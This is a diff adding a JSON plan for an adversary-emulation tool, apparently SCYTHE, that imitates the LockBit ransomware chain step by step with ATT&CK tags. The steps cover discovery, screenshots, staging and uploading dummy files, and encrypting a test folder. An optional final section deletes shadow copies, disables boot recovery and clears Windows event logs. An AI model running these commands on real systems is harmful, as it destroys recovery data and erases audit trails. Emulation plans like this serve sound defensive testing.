@@ -1,0 +1,383 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "https://www.ic3.gov/Media/News/2022/220204.pdf",
+        "display_name": "LockBit",
+        "name": "LockBit",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --heartbeat 1 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "name": "THREAT",
+                "type": "assign",
+                "value": "DESTRUCTIVE"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "rtags": [
+                    "att&ck-technique:T1071",
+                    "att&ck-technique:T1078",
+                    "att&ck-technique:T1078.003"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language",
+                "rtags": [
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "function": "ifelse",
+                "next": "43",
+                "step": "3",
+                "type": "decision",
+                "value": "2092 1068 1067 1059 1079\n1087 1088 2073 1049 1064\n1090 2115 1091",
+                "verb": "contains"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "rtags": [
+                    "att&ck-technique:T1480"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "module": "loader",
+                "module_to_load": "sysinfo",
+                "request": "--load sysinfo",
+                "rtags": [
+                    "att&ck-technique:T1071.001"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
+                "module": "sysinfo",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "module": "loader",
+                "module_to_load": "processes",
+                "request": "--load processes",
+                "rtags": [
+                    "att&ck-technique:T1204.002"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "62dc619d-529a-441f-87e4-89778eee9587",
+                "module": "processes",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir %USERPROFILE%\\Documents",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net use",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\LockBit\"",
+                "rtags": [
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\LockBit\\target_files.xls\" --size 5MB --count 10 --random",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Compress-Archive -Path $env:userprofile\\Desktop\\LockBit -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\LockBit\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1560.002",
+                    "att&ck-technique:T1074.001"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath \"%USERPROFILE%\\Desktop\\LockBit\\exfil.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1041",
+                    "att&ck-technique:T1005"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "IMPACT"
+            },
+            "22": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\LockBit_Ransomware.hta\" --size 1MB --random",
+                "rtags": [
+                    "att&ck-technique:T1078"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\LockBit\\\" --encrypt --password \"LockBit\" --erase --extension lockbit",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/LockBit/Restore-My-Files.txt\" --dest \"%USERPROFILE%\\Desktop\\LockBit\\Restore-My-Files.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell notepad \"%USERPROFILE%\\Desktop\\LockBit\\Restore-My-Files.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1491.001"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "29": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c rmdir /Q /S \"\"%USERPROFILE%\\Desktop\\LockBit\"\"",
+                "rtags": [
+                    "att&ck-technique:T1485"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del \"%USERPROFILE%\\Desktop\\LockBit_Ransomware.hta\"",
+                "rtags": [
+                    "att&ck-technique:T1485"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "DEFENSE EVASION"
+            },
+            "32": {
+                "name": "NO CLEANUP",
+                "type": "assign",
+                "value": "AT YOUR OWN RISK"
+            },
+            "33": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "34": {
+                "function": "ifelse",
+                "next": "43",
+                "step": "33",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "vssadmin Delete Shadows /All /Quiet",
+                "rtags": [
+                    "att&ck-technique:T1490"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "bcdedit /set {default} recoveryenabled No",
+                "rtags": [
+                    "att&ck-technique:T1070.001"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+                "rtags": [
+                    "att&ck-technique:T1070.001"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wmic SHADOWCOPY /nointeractive",
+                "rtags": [],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wevtutil cl security",
+                "rtags": [
+                    "att&ck-technique:T1070.001"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wevtutil cl system",
+                "rtags": [
+                    "att&ck-technique:T1070.001"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wevtutil cl application",
+                "rtags": [
+                    "att&ck-technique:T1070.001"
+                ],
+                "type": "message"
+            },
+            "42": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no",
+                "rtags": [
+                    "att&ck-technique:T1489"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
